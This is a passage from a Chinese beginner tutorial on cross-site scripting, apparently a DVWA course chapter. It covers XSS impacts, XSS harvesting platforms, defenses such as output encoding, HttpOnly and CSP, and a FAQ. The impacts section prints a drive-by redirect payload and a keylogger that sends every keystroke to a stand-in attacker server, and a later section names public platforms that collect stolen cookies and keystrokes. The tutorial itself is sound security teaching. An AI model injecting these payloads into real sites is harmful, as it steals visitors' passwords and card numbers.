通过XSS，攻击者可以注入代码，让浏览器偷偷下载并运行病毒程序。或者把用户重定向到挂马的网站。

比如：
```javascript
<script>
    window.location = 'http://malicious-site.com/virus.exe';
</script>
```

当然，现在浏览器都有安全机制，不会随便下载运行文件。但是如果配合浏览器漏洞，还是很危险的。

### 4. 键盘记录 ⌨️

XSS还可以记录你在网页上敲的所有内容！

比如注入这样的代码：
```javascript
<script>
    document.onkeypress = function(e) {
        var key = String.fromCharCode(e.which);
        // 把按键发送到攻击者的服务器
        new Image().src = 'http://攻击者的网站/keylog.php?key=' + key;
    }
</script>
```

这样一来，你在这个页面上输入的所有东西——用户名、密码、信用卡号——都会被记录下来，发送给攻击者！

太可怕了有没有！😨

### 5. 网站篡改 📝

攻击者还可以通过XSS修改网页的内容。

比如把新闻网站的头条改成假新闻，把电商网站的价格改成1块钱，或者在网站上挂政治敏感内容……

虽然这些改动只是在用户浏览器里临时的（存储型XSS的话可能是永久的），但影响也很坏。

### 6. DDoS攻击 💥

更狠一点的，攻击者可以利用XSS让所有访问页面的用户都变成"肉鸡"，一起去攻击某个网站，造成DDoS（分布式拒绝服务攻击）。

一个人的浏览器可能没什么，但是如果有一万个用户同时访问一个有存储型XSS的页面，那就是一万个请求同时打过去，小网站直接就被打垮了。

---

## XSS平台简介 🌐

你可能会问：搞XSS还要自己搭服务器收Cookie、收键盘记录吗？好麻烦啊……

别急，早就有人帮我们做好了！这就是"XSS平台"。

### 什么是XSS平台？

XSS平台是一种已经搭建好的网站，你只要注册一个账号，就能生成专属的XSS攻击代码。把这段代码注入到有漏洞的网站里，中招的用户的各种信息（Cookie、浏览器信息、输入内容等等）就会自动发送到XSS平台上，你登录你的账号就能看到。

简单说就是：别人帮你搭好了服务器，你直接用就行。

### XSS平台能做什么？

一般的XSS平台都支持这些功能：
- 🍪 获取Cookie
- 📱 获取浏览器信息（User-Agent）
- 🌍 获取IP地址和地理位置
- ⌨️ 键盘记录
- 📋 剪贴板内容
- 👆 鼠标位置记录
- 📸 网页截图
- 🔄 页面重定向
- ……还有很多

功能非常强大！

### 常见的XSS平台

有一些公开的XSS平台，也可以自己搭建。比如：
- xss.pt
- xss.cc
- BlueLotus_XSSReceiver（蓝莲花）
- 各种开源的XSS平台项目

> ⚠️ **重要提醒：** XSS平台只能用于授权的安全测试！未经允许用XSS攻击别人的网站是违法的！我们学习这些知识是为了防御，不是为了搞破坏！记住了吗？

---

## XSS防御方法 🛡️

好了，攻击的方法我们学了不少，现在该学学怎么防御了。毕竟，我们学安全的最终目的是让系统更安全，对不对？

XSS的防御方法有很多，我们一个一个来讲。

### 1. 输出编码（最重要！）🏆

这是防御XSS最核心、最有效的方法！

原理很简单：用户输入的内容，在输出到HTML页面之前，先进行HTML实体编码。把那些特殊字符（`<`、`>`、`"`、`'`、`&`）都转换成实体字符。

比如：
- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `'` → `&#039;`
- `&` → `&amp;`

这样一来，用户输入的`<script>`就会变成`&lt;script&gt;`，浏览器看到这个，就知道这是文本内容，不是HTML标签，就不会解析执行了。

在PHP里，可以用`htmlspecialchars()`函数：
```php
echo htmlspecialchars($user_input);
```

在JavaScript里，如果你要往DOM里插文本，可以用`textContent`而不是`innerHTML`：
```javascript
// 安全的做法
document.getElementById('xxx').textContent = userInput;

// 危险的做法
document.getElementById('xxx').innerHTML = userInput;
```

> 💡 **为什么输出编码最重要？** 因为输入过滤可能会被绕过，但是输出编码几乎是不可能绕过的——只要编码做对了，不管你输入什么，都只会被当成文本显示。

### 2. 输入过滤 🚫

除了输出编码，我们还可以对用户输入进行过滤。

不过要注意：输入过滤是辅助手段，不能替代输出编码！

输入过滤分两种：

**黑名单过滤：** 规定哪些东西不能有，比如不能有`<script>`、不能有`javascript:`等等。
- 缺点：很容易被绕过，因为黑名单列不全所有危险的东西

**白名单过滤：** 规定只能有什么，比如只能是数字、只能是字母、只能是邮箱格式等等。
- 优点：安全，因为只允许已知安全的内容
- 缺点：适用场景有限，不是所有输入都能定义白名单

能用白名单的地方尽量用白名单，比如手机号、邮箱、身份证号这些格式固定的输入。

### 3. HttpOnly Cookie 🍪

这个是专门用来防御Cookie窃取的。

给Cookie设置`HttpOnly`属性后，JavaScript就无法通过`document.cookie`读取Cookie了。这样就算有XSS漏洞，攻击者也偷不到Cookie，大大降低了危害。

在PHP里设置HttpOnly：
```php
session.cookie_httponly = On  // 在php.ini里设置
// 或者
setcookie("user", "abc", time()+3600, "/", "", false, true); 
// 最后一个参数true就是设置HttpOnly
```

这个虽然不能防止XSS，但是能减轻XSS的危害，非常实用！

### 4. CSP（内容安全策略）🛡️

CSP是Content Security Policy的缩写，中文叫"内容安全策略"。这是一个比较新的浏览器安全机制。

简单说，CSP就是告诉浏览器：这个网页只能从哪些地方加载资源，哪些脚本可以执行，哪些不行。

如果设置了严格的CSP，就算有XSS漏洞，攻击者注入的脚本也执行不了——因为浏览器不信任它！

CSP通过HTTP响应头来设置，比如：
```
Content-Security-Policy: default-src 'self'
```

这个意思是：所有资源都只能从当前域名加载。这样攻击者注入的内联脚本、外部脚本，都会被浏览器拦截。

CSP是一个非常强大的防御手段，但是配置起来比较复杂，而且可能会影响网站正常功能。所以一般是作为纵深防御的一环，不是第一道防线。

### 5. 其他防御手段 📦

还有一些其他的防御方法：
- 输入长度限制：对用户输入的长度做限制，增加攻击难度
- 使用框架的自动转义：现代的Web框架（比如React、Vue）默认都会对输出进行编码，大大减少了XSS的风险
- 定期安全测试：经常检查网站有没有XSS漏洞

### 防御原则总结 📋

记住这几条原则，XSS就很难找上你：

1. **永远不要相信用户的输入！** 所有用户输入都是危险的
2. **输出编码是第一道防线，也是最有效的防线**
3. **输入过滤只能作为辅助，不能靠它防御XSS**
4. **能用白名单就用白名单，不要用黑名单**
5. **设置HttpOnly Cookie，减轻危害**
6. **开启CSP，增加一层防护**
7. **尽量使用现代Web框架，它们默认帮你做了很多防护**

---

## 新手常见问题FAQ ❓

### Q1：XSS和SQL注入有啥区别？

**A：** 完全是两种不同的漏洞哦！
- **SQL注入：** 把SQL命令注入到数据库查询里，攻击的是数据库，危害是数据泄露、数据篡改
- **XSS：** 把JavaScript代码注入到网页里，攻击的是其他用户的浏览器，危害是偷Cookie、钓鱼、挂马等等

简单说，一个是搞服务器数据库的，一个是搞其他用户浏览器的。

### Q2：为啥叫"跨站脚本"？跨的啥站？

**A：** 这个名字其实有点历史原因。最早的时候，XSS主要是用来从一个网站窃取数据发送到另一个网站，所以叫"跨站"。

但是现在XSS的危害远不止跨站了，名字就一直沿用下来了。你可以不用纠结名字，知道它是往网页里注入JS代码的攻击就行。

### Q3：反射型XSS好像没啥用啊？还得骗用户点链接，直接发个钓鱼网站不行吗？

**A：** 不一样哦！反射型XSS是出现在**真实的网站域名**下的，用户一看网址是对的，警惕性就低了。

比如你收到一个链接，是`taobao.com/xxx?search=<script>...</script>`，你一看是淘宝的域名，可能就点了。但如果是`taobao-fake.com`，你可能就不点了。

而且反射型XSS可以偷到用户在这个网站的Cookie，钓鱼网站可偷不到。

### Q4：DOM型XSS和反射型XSS好像啊！怎么区分？

**A：** 最简单的区分方法：看恶意代码有没有经过服务器处理。
- **反射型：** 恶意代码是服务器返回的HTML里带的（服务器把URL里的内容拼到HTML里了）
- **DOM型：** 恶意代码是前端JS自己取出来插到页面上的（服务器返回的HTML里没有恶意代码）

你可以这样判断：右键查看网页源代码（不是审查元素，是查看源代码），如果能看到你的恶意代码，就是反射型；如果看不到，就是DOM型。

### Q5：我用了htmlspecialchars，是不是就绝对安全了？

**A：** 大部分情况下是安全的，但也不是100%绝对。比如：
- 如果输出的位置是在HTML标签的属性里（比如`<input value="...">`），需要注意引号的问题
- 如果输出的位置是在JavaScript代码里（比如`<script>var a = "...";</script>`），需要做JS编码
- 如果输出的位置是在CSS里，需要做CSS编码

不同的输出位置需要不同的编码方式。不过htmlspecialchars能防御绝大多数普通场景的XSS了。

### Q6：XSS能拿服务器权限吗？

**A：** 一般来说不能。XSS是客户端漏洞，攻击的是用户的浏览器，不是服务器。

但是，如果管理员被XSS攻击了，攻击者拿到了管理员的Cookie，登录了后台，那可能就能进一步拿服务器权限了。但这不是XSS直接造成的，是间接的。

---

## 本章总结 📝

恭喜你！学完了这一章，你已经掌握了XSS的基础知识！我们来回顾一下都学了啥：

### 核心知识点回顾 ✅

1. **什么是XSS？**
   - 往网页里注入恶意JS代码，其他用户访问时执行
   - 根本原因：用户输入未过滤，直接输出到页面

2. **XSS的三种类型：**
   - 🔄 **反射型：** 非持久化，恶意代码在URL里，需要诱骗点击
   - 💾 **存储型：** 持久化，存在数据库里，所有人访问都中招，危害最大
   - 🌲 **DOM型：** 不经过服务器，完全在浏览器端发生

3. **DVWA四个级别：**
   - 🟢 Low：完全没过滤，直接上
   - 🟡 Medium：过滤了`<script>`，可以用大小写、其他标签绕过
   - 🔴 High：用正则过滤script相关，用其他标签和事件绕过
   - ⚪ Impossible：用htmlspecialchars输出编码，正确的防御姿势

4. **XSS的危害：**
   - 偷Cookie、钓鱼、挂马、键盘记录、网站篡改、DDoS……

5. **XSS的防御：**
   - 🏆 输出编码（最重要！htmlspecialchars）
   - 🚫 输入过滤（白名单优于黑名单）
   - 🍪 HttpOnly Cookie
   - 🛡️ CSP内容安全策略

### 学习建议 💡

- 多动手实战，光看是学不会的
- 可以去XSS平台玩玩，了解更多XSS利用姿势
- 尝试自己写一段有XSS漏洞的代码，然后再修复它
- 多看看真实的XSS漏洞案例，拓宽思路

---

## 下章预告 📢

XSS我们就学到这里啦！下一章我们会继续在DVWA里探索，学习其他好玩的漏洞模块。

后面我们还会学习：
- 📁 文件上传漏洞
- ⚠️ 命令执行漏洞
- 🔐 还有更多有趣的安全知识！

是不是很期待呢？我们下章见！👋

---

> 💡 **温馨提示：** 学习安全知识是为了保护网络安全，不是为了搞破坏哦！未经授权测试别人的网站是违法行为，请遵守法律法规，做一个正义的白帽子！🦸
